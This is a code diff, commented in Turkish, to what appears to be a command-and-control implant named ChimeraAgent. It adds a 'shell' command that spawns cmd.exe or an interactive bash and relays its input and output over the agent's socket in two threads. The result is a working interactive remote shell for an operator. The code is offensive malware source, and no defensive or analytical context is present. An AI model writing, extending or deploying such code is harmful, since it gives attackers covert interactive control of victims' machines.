@@ -15,6 +15,7 @@ import random
 import string
 import types
 import base64
+import threading
 
 # ============================================================
 # Konfigürasyon - generate.py tarafından doldurulacak
@@ -211,6 +212,94 @@ class ChimeraAgent:
     # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
+    def shell_mode(self):
+        """Etkileşimli shell modunu başlatır (Raw Socket)."""
+        # Shell komutunu belirle
+        if sys.platform == "win32":
+            shell_cmd = "cmd.exe"
+        else:
+            shell_cmd = "/bin/bash -i" if os.path.exists("/bin/bash") else "/bin/sh -i"
+            
+        try:
+            # PTY desteği olmadığı için pipe kullanıyoruz.
+            # stderr=subprocess.STDOUT ile hataları da aynı kanaldan alıyoruz.
+            process = subprocess.Popen(
+                shell_cmd,
+                shell=True,
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                bufsize=0  # Unbuffered I/O
+            )
+        except Exception as e:
+            self.send_data(f"[!] Shell başlatılamadı: {e}")
+            return
+
+        # Kullanıcıya shell'in başladığını bildir (HTTP üzerinden son mesaj)
+        self.send_data("[+] Shell oturumu başlatıldı. (Çıkmak için 'exit' yazın)")
+        
+        # Kısa bir bekleme, handler'ın moda geçmesi için
+        time.sleep(1)
+
+        # ----------------------------------------------------
+        # RAW SOCKET MODU (Direct Stream)
+        # ----------------------------------------------------
+        stop_event = threading.Event()
+
+        def sock_to_proc():
+            """Socket -> Process STDIN"""
+            while not stop_event.is_set():
+                try:
+                    data = self.sock.recv(1024)
+                    if not data:
+                        stop_event.set()
+                        break
+                    
+                    # Çıkış kontrolü
+                    if b"exit_shell_mode_now" in data:
+                        stop_event.set()
+                        break
+                        
+                    process.stdin.write(data)
+                    process.stdin.flush()
+                except Exception:
+                    stop_event.set()
+                    break
+
+        def proc_to_sock():
+            """Process STDOUT -> Socket"""
+            while not stop_event.is_set():
+                try:
+                    # Tek byte okuma (Non-blocking gibi davranması için)
+                    byte = process.stdout.read(1)
+                    if not byte:
+                        stop_event.set()
+                        break
+                    self.sock.send(byte)
+                except Exception:
+                    stop_event.set()
+                    break
+
+        # Thread'leri başlat
+        t1 = threading.Thread(target=sock_to_proc, daemon=True)
+        t2 = threading.Thread(target=proc_to_sock, daemon=True)
+        
+        t1.start()
+        t2.start()
+        
+        # Biri durana kadar bekle
+        while not stop_event.is_set():
+            time.sleep(0.1)
+            if not t1.is_alive() or not t2.is_alive():
+                stop_event.set()
+        
+        # Temizlik
+        try: process.terminate()
+        except: pass
+        
+        # Bağlantıyı kapat (Handler da kapatacak, reconnect ile temiz başlangıç yapılacak)
+        self.close_socket()
+
     def execute_command(self, cmd: str) -> str:
         """Sistem komutu çalıştırır.
         
@@ -224,6 +313,10 @@ class ChimeraAgent:
         if cmd.strip().lower() == "terminate":
             self.running = False
             return "Agent sonlandırılıyor..."
+            
+        # Özel komutlar - Shell
+        if cmd.strip().lower() == "shell":
+            return self.shell_mode()
         
         # Özel komutlar - Modül Yönetimi (Faz 2.1)
         if cmd.startswith("loadmodule "):
